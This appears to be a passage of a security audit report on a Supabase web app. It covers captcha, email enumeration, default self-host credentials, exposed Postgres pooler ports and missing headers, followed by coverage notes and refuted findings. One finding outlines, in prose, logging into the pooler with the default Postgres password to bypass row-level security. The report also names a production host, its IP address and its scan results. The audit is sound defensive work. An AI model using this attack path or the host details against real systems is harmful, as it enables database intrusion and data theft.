**Fix** — Behind Supabase's gateway x-forwarded-for is normally set, but do not skip limiting when it is absent — fall back to a global/short-window cap or require captcha in prod. Enable TURNSTILE_SECRET in production so register-request is captcha-gated (currently the only abuse backstop is the honeypot).

---

### 9. 🔵 [LOW] Login captcha is client-only and currently disabled, leaving login with no bot protection (rate limit only)

- **Dimension:** Auth, session, captcha
- **Location:** `web/src/lib/captcha.js:11-12 + web/src/pages/Login.jsx:45-56`
- **Confidence:** high

**Evidence**

```
captcha.js: `export const captchaEnabled = CAPTCHA_SITEKEY.length > 0`. Login.jsx only sends a token when the flag is on: `...(captchaEnabled ? { options: { captchaToken } } : {})`. Per the captcha-turnstile memory note, captcha is 'Currently OFF in prod' (VITE_TURNSTILE_SITEKEY unset, GoTrue GOTRUE_SECURITY_CAPTCHA_ENABLED not set in selfhost/docker-compose.yml — no CAPTCHA vars present there). The Turnstile widget is a client-side render; the real guard is GoTrue's server-side captcha verification, which is only active when GOTRUE_SECURITY_CAPTCHA_ENABLED is set.
```

**Impact** — While OFF (current prod state), an attacker can script credential-stuffing / brute-force directly against the GoTrue token endpoint or via signInWithPassword with no captcha challenge. Only Supabase's per-IP rate limit throttles this. For a members-only app this is bot-abuse / password-guessing exposure rather than direct account takeover, hence low. Note this is the inherent property of any client-rendered captcha: even with the widget visible, calling the API directly bypasses the UI — only the server-side GoTrue/edge-fn verification is load-bearing, and that is correctly fail-closed when the lockstep trio is enabled.

**Fix** — Enable the lockstep trio (VITE_TURNSTILE_SITEKEY + GOTRUE_SECURITY_CAPTCHA_ENABLED/PROVIDER=turnstile/SECRET + edge-fn TURNSTILE_SECRET) in prod so login bot-gating is enforced server-side. Until then, rely on (and tighten) Supabase GoTrue rate limits as the sole brute-force throttle. Confirm GOTRUE_SECURITY_CAPTCHA_* is actually set wherever GoTrue runs — it is absent from selfhost/docker-compose.yml, so the self-host stack would have NO server-side login captcha even if the frontend sitekey is set (half-on).

---

### 10. 🔵 [LOW] Registration endpoint discloses whether an email already has an account (enumeration)

- **Dimension:** Auth, session, captcha
- **Location:** `supabase/functions/register-request/index.ts:113-118`
- **Confidence:** high

**Evidence**

```
`const { data: exists } = await admin.rpc('email_exists', { p_email: email }); if (exists === true) return json({ error: 'This email is already registered. Try logging in instead.' }, 409)` and the pending-request branch returns 'A request for this email is already under review.' Mirrored client-side in authErrors.js: `EXISTING_EMAIL_MESSAGE = 'A user with that email already exists.'`
```

**Impact** — Anyone can probe the public register-request endpoint to learn whether a given email is a member of this private network (and whether a request is pending), i.e. membership enumeration. The edge fn rate-limits to 5/hour/IP which slows but does not stop bulk probing across IPs.

**Fix** — This is documented as a deliberate product tradeoff in authErrors.js ('we DO reveal a user with that email already exists'). Accept and document it, or return a generic 'request received' for duplicates the same way ForgotPassword does, if membership privacy matters for this network.

---

### 11. 🔵 [LOW] target="_blank" external links use rel="noreferrer" without explicit noopener (reverse-tabnabbing — low residual risk)

- **Dimension:** XSS & untrusted content
- **Location:** `web/src/pages/Profile.jsx:122, UserProfile.jsx:99, Directory.jsx:154, TeamAcquisition.jsx:509, Calendar.jsx:191, Calendar.jsx:225, PipelineIdea.jsx:688`
- **Confidence:** high

**Evidence**

```
`<a href={profile.linkedin} target="_blank" rel="noreferrer" ...>` — rel lacks an explicit `noopener` token; only `noreferrer` is set.
```

**Impact** — `rel="noreferrer"` implies noopener in all current browsers, so the opened page cannot reach back via window.opener to navigate the IFN tab (reverse tabnabbing). Residual risk is near-zero on modern browsers; flagged only for completeness and because the LinkedIn target is attacker-controllable (XSS-1) and could otherwise point at a phishing redirect. The AdminPanel.jsx:572 internal Link uses `rel="noopener"` (without noreferrer) — fine for an internal route.

**Fix** — Standardize external-link anchors to `rel="noopener noreferrer"` for explicitness and to be robust against older/embedded webviews. Low priority; the substantive fix is XSS-1.

---

### 12. 🔵 [LOW] selfhost/.env.example ships copy-paste-ready weak/demo credentials (untracked, but it is the live self-host migration target)

- **Dimension:** Secrets, config, supply chain
- **Location:** `selfhost/.env.example:30,33,35,36,59,62,77,78,272`
- **Confidence:** high

**Evidence**

```
POSTGRES_PASSWORD=your-super-secret-and-long-postgres-password; JWT_SECRET=your-super-secret-jwt-token-with-at-least-32-characters-long; ANON_KEY / SERVICE_ROLE_KEY = the well-known public Supabase demo JWTs (signed by the demo JWT_SECRET, so guessable/forgeable if JWT_SECRET is left default); DASHBOARD_PASSWORD=this_password_is_insecure_and_should_be_updated; SECRET_KEY_BASE / S3 keys / MINIO_ROOT_PASSWORD=secret1234 are hardcoded defaults. The actual on-disk selfhost/.env still contains these exact demo defaults (POSTGRES_PASSWORD=your-super-secret..., the demo SERVICE_ROLE_KEY).
```

**Impact** — If the self-host box (per the active feat self-host migration to the Windows EC2 target in Untitled.md) is brought up without rotating these, the public demo JWT_SECRET lets anyone mint a valid service_role JWT and bypass all RLS over the internet. This is the standard Supabase self-host warning; flagged because the migration is in-flight and the on-disk .env has not yet been rotated. selfhost/ is untracked so this is NOT a committed-secret leak.

**Fix** — Before the self-host stack faces any network: rotate JWT_SECRET (regenerate ANON_KEY/SERVICE_ROLE_KEY against the new secret), POSTGRES_PASSWORD, DASHBOARD_PASSWORD, SECRET_KEY_BASE, S3/MINIO creds. The REBUILD-GUIDE/runbook should make rotation a blocking step, not optional.

---

### 13. 🔵 [LOW] Postgres pooler (Supavisor) published to 0.0.0.0 on 5433/6543 — and NOT reset even when the TLS proxy is enabled

- **Dimension:** Self-host & infra exposure
- **Location:** `selfhost/docker-compose.yml:535-537`
- **Confidence:** high  ·  **Verdict:** needs-context  ·  _(severity adjusted critical → low on verification)_

**Evidence**

```
supavisor service:
    ports:
      - 5433:5432
      - ${POOLER_PROXY_PORT_TRANSACTION}:6543   (= 6543:6543)
No 127.0.0.1 binding -> binds 0.0.0.0. docker-compose.caddy.yml / docker-compose.nginx.yml only do `kong: ports: !reset []`; neither resets the supavisor ports (grep for supavisor/5433/6543 in both overrides returns nothing).
```

**Impact** — 5433 is the session-mode pooler routing to supabase_admin/postgres; 6543 is transaction-mode. Both speak the raw Postgres wire protocol straight to the DB, completely bypassing Kong, PostgREST, RLS and the reverse proxy. Anyone who can reach the host on 5433/6543 + the password (SH-02 default) gets a full SQL session as a privileged role. The runbook's stated rule "Do NOT expose Postgres (5432) or Kong (8000) publicly" is silently violated by the compose file even for the Caddy/nginx 'production' path, because only Kong gets reset.

**Exploit** — Not exploitable on the documented/observed production deployment. The pooler binds 0.0.0.0 on the Docker host, but the AWS Security Group fronting the prod EC2 box default-drops inbound and only permits 80/443 (confirmed by external nmap: 995 filtered, 5433/6543 not open), and a Security Group cannot be bypassed by Docker's host-firewall iptables manipulation. The only path to a real exploit is an UNDOCUMENTED misdeployment: run the stack on a Linux host that relies solely on host-level UFW (no cloud Security Group / no external packet filter). Then: attacker scans the host, finds 5433/6543 open (Docker's DOCKER iptables chain bypasses UFW INPUT rules), connects with psql to host:5433 using the default POSTGRES_PASSWORD `your-super-secret-and-long-postgres-password` as supabase_admin/postgres, and obtains a full privileged SQL session bypassing RLS — read/write all tables, dump auth.users, escalate. This is contingent and not the actual prod posture; on prod it is refuted by the Security Group.

**Fix** — Bind these to loopback: `- 127.0.0.1:5433:5432` / `- 127.0.0.1:6543:6543`, or add `ports: !reset []` for supavisor in the caddy/nginx overrides, or remove the published pooler ports entirely if the app only uses PostgREST. Additionally rely on the host firewall/security group to allow only 80/443 inbound (defense in depth).

<details><summary>Verifier reasoning</summary>

The compose-level defect is REAL and reproduced: selfhost/docker-compose.yml:535-537 publishes the supavisor pooler on 5433:5432 (session mode, DATABASE_URL routes as supabase_admin) and ${POOLER_PROXY_PORT_TRANSACTION}:6543 = 6543:6543 (transaction mode) with no 127.0.0.1 prefix, so it binds 0.0.0.0 on the Docker host. The TLS-proxy overrides docker-compose.caddy.yml:16-17 and docker-compose.nginx.yml:16-17 only do `kong: ports: !reset []`; grep across both confirms neither resets supavisor/5433/6543. So the "production" Caddy/nginx path does leave the raw Postgres wire protocol listening on the host interface, bypassing Kong/PostgREST/RLS. The .env ships the SH-02 default password (.env:30 `your-super-secret-and-long-postgres-password`). All of that is accurate.

But the claimed CRITICAL impact hinges entirely on the finding's own premise — "anyone who can reach the host on 5433/6543." That reachability is gated by a perimeter firewall, which is the compensating control, and it is BOTH mandated and observed: (1) the prod runbook (reference/IFN Backend - Self-Host Migration Runbook.md:62) mandates "Open firewall ports 80 and 443 only. Do NOT expose Postgres (5432) or Kong (8000) publicly"; (2) the prod target is an AWS EC2 box (per self-host-migration memory: AWS EC2 Windows Server, stack inside WSL2+Docker, IIS reverse-proxying to Kong at 127.0.0.1:8000) where inbound filtering is an AWS Security Group enforced on the ENI OUTSIDE the guest OS — Docker's well-known iptables/UFW bypass cannot defeat a Security Group; (3) the actual external nmap of prod (Untitled.md, iiec.ifheindia.org / 3.109.15.154, ec2-...ap-south-1) reports "Not shown: 995 filtered tcp ports (no-response)" with only 80, 443, 2000 (sccp), 5060 (sip) open — 5433 and 6543 are NOT reachable from the internet. The Docker 0.0.0.0 bind makes the pooler listen on the host NIC, but the Security Group default-drops unsolicited inbound, so it is not externally exploitable on the real prod target.

Why needs-context rather than refuted: the refutation is environment-dependent, not code-intrinsic. There is no code/RLS/grant compensating control — the safety comes entirely from the external Security Group + IIS-only ingress. If the stack were ever run on a Linux host whose only firewall is host-level UFW (the runbook's generic Phase-0 path mentions Hetzner/DO/AWS/Azure), Docker's iptables DOCKER chain would punch straight past UFW and 5433/6543 WOULD be internet-reachable with the default password = full privileged SQL session. The compose file is genuinely wrong and should reset the supavisor ports (or bind 127.0.0.1) in the caddy/nginx overrides; the finding correctly identifies a latent misconfiguration. It is the "critical, exploitable on prod" framing that is not supported by the observed prod network posture.

Files: selfhost/docker-compose.yml:531-537 (defect), selfhost/docker-compose.caddy.yml:16-17 + selfhost/docker-compose.nginx.yml:16-17 (incomplete reset — only kong), selfhost/.env:30 + :118 (default password, 6543 port), reference/IFN Backend - Self-Host Migration Runbook.md:62 (firewall mandate), Untitled.md (prod nmap showing 5433/6543 filtered).

</details>

---

### 14. 🔵 [LOW] Reverse proxy configs set no HSTS / CSP / X-Frame-Options / X-Content-Type-Options

- **Dimension:** Self-host & infra exposure
- **Location:** `selfhost/volumes/proxy/caddy/Caddyfile:1-18`
- **Confidence:** high

**Evidence**

```
Caddyfile only emits `header -server` (strips the Server header) and proxies to kong/studio; no Strict-Transport-Security, Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, or Referrer-Policy. nginx template (supabase-nginx.conf.tpl) sets server_tokens off but likewise adds none of these security headers.
```

**Impact** — Studio and the app domain are served without HSTS (TLS-downgrade/SSL-strip window), without clickjacking protection (X-Frame-Options/frame-ancestors), and without MIME-sniffing protection. Lower impact than the credential/exposure issues above and partly mitigated by the SPA being hosted separately, but the self-hosted Studio dashboard in particular should not be framable and should be HSTS-pinned.

**Fix** — Add a header block in the Caddyfile (Strict-Transport-Security "max-age=63072000; includeSubDomains; preload", X-Frame-Options DENY or CSP frame-ancestors 'none', X-Content-Type-Options nosniff, Referrer-Policy strict-origin-when-cross-origin) and equivalent add_header directives in the nginx template.

---

### 15. ⚪ [INFO] create-member / review-registration: profiles.role admin check returns 403 only on role mismatch, but treats a profiles read error (meErr) inconsistently

- **Dimension:** Edge functions authz
- **Location:** `/home/basil/lumenor/ifn/supabase/functions/review-registration/index.ts:93`
- **Confidence:** high

**Evidence**

```
const { data: me } = await caller.from('profiles').select('role').eq('id', userData.user.id).single()
  if (me?.role !== 'admin') return json({ error: 'Not authorized' }, 403)
```

**Impact** — No privilege escalation: a failed/empty profiles read yields me=undefined, me?.role !== 'admin' is true, so it correctly fails closed with 403. Noting only that review-registration drops the meErr binding that create-member keeps (create-member checks meErr || me?.role !== 'admin'). Functionally equivalent here because the JWT is already validated by getUser() and the fallback is deny. No action required beyond consistency.

**Fix** — Optional: mirror create-member and bind/check the error explicitly for clarity. Current behavior is fail-closed and safe.

---

### 16. ⚪ [INFO] send-contact: contact_log row is written (counts against daily cap) before the email send is attempted

- **Dimension:** Edge functions authz
- **Location:** `/home/basil/lumenor/ifn/supabase/functions/send-contact/index.ts:51`
- **Confidence:** high

**Evidence**

```
const { error: gateErr } = await asUser.rpc('contact_member', { p_to: to, p_subject: subj })  // inserts contact_log
  ... later: try { await sendEmail(...) } catch (e) { return json({ error: `Delivery failed...` }, 502) }
```

**Impact** — If delivery fails, the attempt still counted against the sender's 10/day cap. Minor UX/abuse-accounting issue, not a security boundary problem — it fails toward fewer messages, not more.

**Fix** — Acceptable as-is. If desired, only log on successful send, but logging-before-send is the safer (anti-abuse) ordering.

---

### 17. ⚪ [INFO] Email verification is config-dependent; GoTrue autoconfirm must stay off in prod or unverified emails gain access

- **Dimension:** Auth, session, captcha
- **Location:** `selfhost/.env.example:169 + selfhost/docker-compose.yml:163`
- **Confidence:** medium

**Evidence**

```
`ENABLE_EMAIL_AUTOCONFIRM=false` wired to `GOTRUE_MAILER_AUTOCONFIRM: ${ENABLE_EMAIL_AUTOCONFIRM}`. The app trusts GoTrue: Login.jsx surfaces 'email not confirmed' via authErrors.js but does not itself enforce verification — if AUTOCONFIRM is flipped to true, accounts sign in with unverified emails. Approved-member accounts are created with email_confirm:true by review-registration/create-member edge fns, so the normal path is fine; risk is only a misconfiguration of the public direct-signup path.
```

**Impact** — No issue in the intended flow (public signup is a request queue, not a direct account). Flagged so the deploy checklist keeps GOTRUE_MAILER_AUTOCONFIRM=false and GOTRUE_MAILER_ALLOW_UNVERIFIED_EMAIL_SIGN_INS=false in prod, since these are the only thing standing between an unverified email and a session.

**Fix** — Add GOTRUE_MAILER_AUTOCONFIRM=false and GOTRUE_MAILER_ALLOW_UNVERIFIED_EMAIL_SIGN_INS=false to the prod/staging deploy checklist and verify them post-deploy. Optionally have the app double-check session.user.email_confirmed_at before granting access, so a GoTrue misconfig cannot silently let unverified emails in.

---

## Coverage (proof of what was reviewed)

**RLS & privilege escalation** — Read all 22 files in /home/basil/lumenor/ifn/db/*.sql in full. Verified: (1) every table has `enable row level security` — profiles, banned_emails, app_settings, posts, post_votes, comments, sub_threads, tags, post_tags, tag_requests, problems, problem_solutions, problem_votes, poll_options, poll_votes, events, notifications, pipeline_ideas + 6 child pipeline tables, team_posts, team_applications, contact_log, invites, registration_requests — all RLS-enabled (grepped, no table missing). (2) Column-level GRANT/REVOKE on profiles: cross-checked every `revoke update(...)` (grep) — banned/restricted/restricted_reason/directory_pinned are revoked from authenticated, but role and member_type are NOT; base `grant all on table public.profiles to authenticated` (profiles.sql:35) therefore leaves them client-writable. Confirmed no BEFORE UPDATE trigger on profiles guards columns (only AFTER INSERT triggers on auth.users). (3) INSERT policies forcing identity via WITH CHECK: posts/problems/team_posts/post_votes/problem_votes/comments/sub_threads all check `author_id/user_id = auth.uid()` — no identity spoofing. (4) SECURITY DEFINER + search_path: block-scanned admin/tags/pipeline/profiles and all others — every definer function pins `set search_path` (count mismatches were `security definer` occurring in comment lines, not real functions). Every admin RPC calls is_admin(); internal writers (notify, log_transition, check_application) are `revoke execute ... from public, authenticated`. (5) `using(true)` SELECT policies reviewed for PII: comments/sub_threads/post_tags/tags/problems/problem_solutions/problem_votes/problem_upvotes/team_posts/events/app_settings — none expose email/phone (those live on profiles which is read-own; directory/public_profile RPCs deliberately omit phone/email). No `with check(true)` write policy found. (6) Ban/read-only enforcement: traced every direct-client write path against can_write()/write_guard().

**Edge functions authz** — Read all edge functions fully: create-member/index.ts, register-request/index.ts, review-registration/index.ts, send-contact/index.ts, send-invites/index.ts, _shared/password.ts, _shared/resend.ts. Cross-checked the DB-layer authorization the email functions delegate to: db/admin.sql (is_admin() uses auth.uid() + role='admin', security definer; granted to authenticated), db/invites.sql (admin_create_invites/admin_mark_invites_sent all gated by is_admin()), db/directory.sql contact_member() (gates: authenticated, not self, recipient must be banned=false + directory_visible + contactable, daily cap 10, audit log). Verified there is no supabase/config.toml, so functions default to verify_jwt=ON except register-request (documented --no-verify-jwt, intentionally public).

AUTHZ verdict: create-member and review-registration both correctly self-authorize — they build an anon client with the caller's Authorization header, call auth.getUser() (validates the JWT against GoTrue), then read profiles.role under the caller's own RLS and require role==='admin' (403 otherwise) BEFORE any service-role action. role/action/member_type params are whitelist-validated. A non-admin cannot mint an admin account: create-member requires the caller to already be admin; review-registration likewise. send-invites and send-contact do NOT use the service role for the privileged decision — they call admin/ban-gated RPCs with the caller's JWT, so Postgres is_admin()/auth.uid() is the single source of truth. password.ts uses crypto.getRandomValues with rejection sampling (no modulo bias), 16 chars, class-diverse — strong entropy. resend.ts escapeHtml covers &<>\"'. send-contact addresses recipients by user-id (uuid), not arbitrary email -> no open relay; HTML fields escaped; subject goes into Resend JSON (no header injection). CORS is '*' but all sensitive functions use Bearer-token auth (no cookies/credentials), so wildcard origin does not enable CSRF/credentialed cross-origin abuse. No service-role key returned to client; console.error logs error objects, not secrets.

Found NO critical/high broken-access-control issues. Findings below are lower-severity hardening items.

**Auth, session, captcha** — Read in full: web/src/lib/supabase.js, web/src/lib/AuthProvider.jsx, web/src/lib/captcha.js, web/src/lib/authErrors.js, web/src/components/ProtectedRoute.jsx, PublicOnlyRoute.jsx, OnboardingGate.jsx, web/src/pages/Login.jsx, Register.jsx, ForgotPassword.jsx, ResetPassword.jsx, Onboarding.jsx, AdminPanel.jsx (top + grep of guards), supabase/functions/register-request/index.ts. Grepped db/admin.sql for is_admin() guards on admin RPCs, App.jsx for route wiring, selfhost/docker-compose.yml + .env.example + CONFIG.md for GoTrue captcha + email-autoconfirm config, and all auth pages/route guards for redirect/next params.

Verified CLEAN: (1) Admin access control is enforced server-side — every admin RPC in db/admin.sql begins with `if not public.is_admin() then raise exception 'admins only'`, and the /admin route additionally has a client guard (`if (profile && !isAdmin) return <Navigate to=\"/\" />` in AdminPanel.jsx:116). Client guard is UX-only, real guard is the RPC/RLS — correct layering. (2) No open redirect: Login/Onboarding hardcode navigate('/'); no `next`/`redirect`/`returnTo` param is read anywhere in the auth pages or route guards. (3) Captcha, WHEN ON, is enforced server-side on both flows: login via GoTrue-native options.captchaToken, register via verifyTurnstile() in the edge fn (fail-closed: missing/invalid token -> 400). Single-use token reset logic is correct. (4) ResetPassword uses GoTrue recovery session (updateUser({password})) not a URL-embedded token the client parses; reset email is generic (no enumeration in ForgotPassword). (5) Banned users are gated in ProtectedRoute (UX) and banned flag drives RLS server-side per architecture.

**IDOR & client-side writes** — Grepped all 152 client DB call sites in web/src (.from/.insert/.update/.delete/.rpc/.upsert/storage). Mapped each direct table write to its RLS/grant in db/*.sql.

CHECKED CLEAN:
- post_votes (db/votes.sql) and problem_votes (db/problem_votes_v2.sql): insert/update/delete carry `with check (user_id = auth.uid())`; client-supplied user_id (PostDetail.jsx:110, ProblemHub.jsx:56, PostCard.jsx:37, ProblemDetail.jsx:106) cannot spoof another user. PK (post_id,user_id) prevents ballot stuffing.
- comments / sub_threads (db/comments.sql): insert `with check (author_id = auth.uid())` (+comments_locked/can_write; sub_threads restricted to the post's author); delete scoped to author. PostDetail.jsx:126/139/150/160 safe. Admin moderation goes through admin_delete_comment/admin_delete_post RPCs.
- posts (db/posts.sql): insert/update/delete owner-scoped; sensitive cols (pinned, author_id, comments_locked, badges, success_request, kind) REVOKEd from authenticated; admin actions via admin_* RPCs. CreatePostModal.jsx & PostDetail.jsx delete safe.
- problems / problem_solutions (db/problemhub.sql): owner-scoped RLS, author_id revoked, admin_delete_problem/solution RPCs. ProblemModal.jsx:58-59, ProblemDetail.jsx safe.
- team_posts (db/teamboard.sql): owner-scoped insert/update/delete; closed/admin-delete via set_team_closed/admin_delete_team_post RPCs. TeamAcquisition.jsx:362-363 safe.
- notifications (db/notifications.sql): NO client INSERT policy (clients cannot write notifications to other users -> no spam/phishing vector); notify() revoked from authenticated; update scoped to own + all cols except read_at revoked; delete own. Notifications.jsx:134/138 safe.
- Storage: idea-files upload policy checks is_idea_author(idea_path_uuid(name)) so a user cannot upload into another user's idea path (PipelineIdea.jsx:739); idea-files read via can_access_idea; createSignedUrl for registration-certs is admin-only RLS (is_admin()), so RequestsTab viewCert (AdminPanel.jsx:693) cannot be replayed by a normal member. download() signed URLs (PipelineIdea.jsx:756) gated by the same read policy.
- The huge RPC surface (pipeline, mentor, admin_*, polls, directory) is SECURITY DEFINER and self-authorizes (is_admin/is_mentor_or_admin/can_access_idea) — out of scope for direct-write IDOR.

NOT CLEAN (below): idea_autopsies has no tracked schema/RLS at all; profiles role/member_type column revokes are absent from tracked SQL.

**XSS & untrusted content** — Read all 21 pages and components under /home/basil/lumenor/ifn/web/src/. Confirmed ZERO dangerouslySetInnerHTML and ZERO innerHTML usage across the codebase (grep clean). No markdown/HTML rendering library, no emoji/mention HTML parser, no img/avatar tags using user-supplied src (avatars are CSS-rendered initials — no `src=` attributes exist anywhere). All inline `style={}` use computed numeric widths (Spinner, PollBlock, Notifications skeletons, AdminPanel skeletons, Register honeypot) — none interpolate user data into style strings. Notification payloads (Notifications.jsx:165) and team/post/autopsy text (e.g. TeamAcquisition.jsx:503 message via whitespace-pre-wrap) are rendered as plain `{}` text — React auto-escapes. All `<Link to={`...`}>` destinations (AuthorLink /u/:id, RightSidebar /?tag=, Calendar /pipeline/:id, AdminPanel /pipeline/:id) are internal SPA routes with UUID/encodeURIComponent'd params — React Router emits relative hrefs, no scheme injection. `window.open(data.signedUrl)` (AdminPanel.jsx:695, PipelineIdea.jsx:757) uses Supabase Storage signed URLs from a SECURITY DEFINER RPC — server-controlled, safe. `googleCalUrl` (lib/calendar.js:43) hardcodes the https://calendar.google.com origin and puts user text only in query params — safe. The ONLY sinks rendering an arbitrary user-controlled URL as an anchor href are the LinkedIn fields, examined in full below.

**Secrets, config, supply chain** — Enumerated all 141 git-tracked files (`git ls-files`); inspected every tracked env/config: web/.env.production, web/.env.example, web/.env.selfhost.example, web/vite.config.js, web/package.json, web/package-lock.json, web/eslint/postcss/tailwind configs. Read untracked web/nohup.out (clean: only Vite startup banner, no tokens/PII). git grep across web/ + supabase/ + db/ for sb_secret/service_role/sk_/re_/eyJ/bearer/JWT_SECRET/POSTGRES_PASSWORD/SMTP_PASS — every hit is either a Deno.env.get() read in edge functions (platform-injected, not hardcoded), a doc comment, or an npm integrity hash. Verified client (web/src/lib/supabase.js) consumes only VITE_SUPABASE_ANON_KEY (the public publishable key). Checked console.log/error in web/src (only logs Supabase error objects, no tokens/session). Confirmed Vite has no sourcemap:true (default build = sourcemaps off). Verified selfhost/ dir is ENTIRELY untracked; selfhost/.env is gitignored and on-disk still holds upstream Supabase demo defaults (no real secrets present). No .pem/.key/.p12/id_rsa tracked. Lockfile (package-lock.json) tracked; all 'resolved' URLs point to registry.npmjs.org (no alternate-registry supply-chain risk). Checked git check-ignore on .env variants.

**Self-host & infra exposure** — Read in full: selfhost/docker-compose.yml (base; port publishing, all service env), docker-compose.override.yml (active per .env COMPOSE_FILE — adds mailpit only, NO proxy), docker-compose.caddy.yml, docker-compose.nginx.yml (port-reset behavior), dev/docker-compose.dev.yml, .env.example AND the live .env (gitignored but present on disk), volumes/api/kong.yml (gateway routes/ACL/dashboard basic-auth), volumes/db/webhooks.sql (pg_net grants), volumes/proxy/caddy/Caddyfile, volumes/proxy/nginx/supabase-nginx.conf.tpl, README.md, and Untitled.md (prod nmap). Grepped db/ and selfhost/volumes/db/init for net.http / pg_net / supabase_functions.http_request usage (none found in the app schema). Verified PGRST_DB_SCHEMAS=public,storage,graphql_public (net schema NOT exposed). Verified interface binding: no 127.0.0.1 prefixes on published ports in base compose -> 0.0.0.0. Confirmed .env tracking via git check-ignore/ls-files. Cross-checked the migration runbook (reference/IFN Backend - Self-Host Migration Runbook.md) which states the correct intent (firewall 80/443 only, regenerate keys, Caddy in front, Kong on localhost) — the shipped compose/.env do not yet match that intent. Did not exec docker (no running stack to probe); findings are from config as-committed/as-staged.

## Appendix — Refuted / withdrawn after verification

- **gitignore gap: plain `.env` at repo root and `web/.env` are not ignored — a service-role key pasted there would be committable** (`web/.gitignore / .gitignore (root)`, claimed medium) — The reproduction is factually correct — `git check-ignore -v web/.env` and `.env` (root) both exit 1 (NOT ignored), and neither gitignore has `.env`/`.env.*` rules. But this is a defense-in-depth gap, not an exploitable finding, because no secret would ever naturally land in those paths:

1. ALL server secrets are stored elsewhere, correctly. Edge functions read SUPABASE_SERVICE_ROLE_KEY / RESEND_API_KEY / TURNSTILE_SECRET via Deno.env.get() and are provisioned through `supabase secrets set` (web/.env.production literally documents "supabase secrets set TURNSTILE_SECRET=<secret>"). The self-ho

- **Live .env ships Supabase demo JWT secret + public well-known anon/service_role keys** (`selfhost/.env:33-36`, claimed critical) — The finding's core premise — that this live .env "ships" with the app — is false. /home/basil/lumenor/ifn/selfhost/.gitignore line 3 lists `.env` (and line 5 `docker-compose.override.yml`), and `git check-ignore -v` confirms both are ignored. More decisively, the ENTIRE selfhost/ directory is UNTRACKED: `git status` shows `?? selfhost/` and `git ls-files selfhost/` returns nothing — not the .env, not even .env.example. So no demo JWT_SECRET/ANON_KEY/SERVICE_ROLE_KEY is committed to the repo or distributed to anyone cloning it. There is no leaked-secret-in-VCS exposure.

The auditor correctly i

- **Default POSTGRES_PASSWORD and DASHBOARD_PASSWORD in live .env** (`selfhost/.env:30,59`, claimed critical) — The .env content is accurately quoted, but every load-bearing claim about exploitability is false in this repo.

1) NOT a shipped/committed artifact. /home/basil/lumenor/ifn/selfhost/.env is gitignored (selfhost/.gitignore line: `.env`) and was NEVER committed — `git log --all -- selfhost/.env` is empty and `git ls-files --error-unmatch selfhost/.env` errors. In fact ZERO files under selfhost/ are git-tracked (`git ls-files selfhost/` returns 0). So these defaults are a developer's local rehearsal file on the Linux dev box, not part of any deployed/distributed codebase. An auditor reading the 

- **Active compose profile runs WITHOUT the TLS/auth reverse proxy — Kong 8000 exposed plaintext on 0.0.0.0** (`selfhost/.env:11`, claimed high) — The finding rests on `selfhost/.env:11`, but that file is gitignored and untracked (selfhost/.gitignore lists `.env`; `git ls-files` returns no `.env`) — it is the auditor's machine-local staging config, NOT the deployed artifact. The TRACKED template `selfhost/.env.example:11` is `COMPOSE_FILE=docker-compose.yml` with no override at all (not even Mailpit), so the claim "this profile is the on-disk default that gets deployed" is false. The override the auditor saw (docker-compose.override.yml) only adds Mailpit and self-documents as "Staging only" (lines 1-4). Compensating controls in the depl

- **pg_net (net.http_get/http_post) EXECUTE granted to anon & authenticated — latent SSRF, not yet reachable via the API** (`selfhost/volumes/db/webhooks.sql:151,158-159,177,184-185`, claimed medium) — The grants are real and exactly as cited (selfhost/volumes/db/webhooks.sql:151-159, 177-185): net.http_get/net.http_post are SECURITY DEFINER with EXECUTE granted to anon/authenticated/service_role. But these grants are not reachable through the only server-side entrypoint that anon/authenticated have — PostgREST — so they are not currently exploitable.

Compensating controls (all present in the current state, not hypothetical):
1) net is NOT an exposed schema. PGRST_DB_SCHEMAS=public,storage,graphql_public in the REAL config file (selfhost/.env:295, not just .env.example), and PGRST_DB_EXTRA_

- **Production host iiec.ifheindia.org exposes unexpected services on 2000 and 5060 to the internet** (`Untitled.md:9-14`, claimed medium) — The "evidence" (Untitled.md:1-16) is a raw `nmap -sS -sV` scratch dump the user pasted, not a vulnerability in this codebase. Three reasons it is not a valid/exploitable finding against this repo:

1) Wrong target / no in-repo cause. The scan is of iiec.ifheindia.org (3.109.15.154), the pre-existing ICFAI/IFH campus IIS 10 web host, managed by campus IT. Nothing in this repo opens, configures, or deploys ports 2000 or 5060. The IFN self-host stack only binds web ports: selfhost/docker-compose.caddy.yml:25-28 and docker-compose.nginx.yml:25-27 publish 80/443 only; docker-compose.yml:535-536 exp

